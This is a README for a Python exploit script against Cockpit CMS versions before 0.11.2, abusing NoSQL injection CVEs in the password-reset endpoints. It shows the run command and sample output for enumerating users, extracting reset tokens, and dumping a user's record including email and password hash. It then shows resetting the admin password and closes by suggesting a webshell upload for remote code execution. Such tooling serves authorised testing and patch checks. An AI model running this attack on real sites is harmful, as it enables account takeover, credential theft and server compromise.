# Cockpit CMS NoSQL Injection (CVE-2020-35847, CVE-2020-35848) 

Cockpit CMS before version 0.11.2 is vulnerable to a NoSQL Injection vulnerability in the **/auth/resetpassword** and /**auth/newpassword** that allows extraction of password reset tokens which allow for user details enumeration as well as password reset.

> Read More - https://swarm.ptsecurity.com/rce-cockpit-cms/

This python script enumerates users on the system, and resets the password.

# Usage

```bash
python3 exploit.py -u http://cockpit-site-url
```

The script first enumerates users on the system.
```bash
[+] http://cockpit-site-url: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'user1', 'user2', 'user3']
```
Then you can choose which user to gather more information on. This also generates reset tokens for that user, a key requirement in the password reset.

```bash
[-] Get user details For : admin
[+] Finding Password reset tokens
         Tokens Found : ['rp-4e82b990aff752bfb1dc9845d5338f6e610d0608bb75e']
[+] Obtaining user information 
-----------------Details--------------------
         [*] user : admin
         [*] name : Admin
         [*] email : admin@yourdomain.de
         [*] active : True
         [*] group : admin
         [*] password : $2y$10$6uQ2PXh4vShH.D4gw..WtO0NHQq7J36ugmwKNtJGzu9p9OqSEpVUW
         [*] i18n : en
         [*] _created : 1621655201
         [*] _modified : 1621655201
         [*] _id : 60a87ea165343539ee000300
         [*] _reset_token : rp-4e82b990aff752bfb1dc9845d5338f6e610d0608bb75e
         [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------
```
Finally you can choose to reset the user's password.

```bash
[+] Do you want to reset the passowrd for admin? (Y/n): y
[-] Attempting to reset admin's password:
[+] Password Updated Succesfully!
[+] The New credentials for admin is: 
         Username : admin 
         Password : new_random_password
```

You can then choose to upload a webshell to the /finder component to gain RCE.
